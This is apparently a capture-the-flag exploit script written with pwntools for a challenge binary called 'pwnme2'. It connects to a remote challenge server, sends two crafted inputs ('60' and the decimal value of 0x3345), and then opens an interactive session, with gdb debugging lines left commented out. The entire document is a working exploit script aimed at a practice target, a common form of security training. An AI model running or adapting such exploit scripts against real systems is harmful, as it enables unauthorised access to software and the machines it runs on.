from pwn import *

e = ELF("pwnme2")

#r = e.process()
r = remote('0.cloud.chals.io',16612)
#gdb.attach(r, '''
#set disable-randomization on
#break main
# break vuln
#''')
print(r.recv())

payload1 = "60"
payload2 = str(int(0x3345))

r.sendline(payload1)
r.sendline(payload2)

r.interactive()
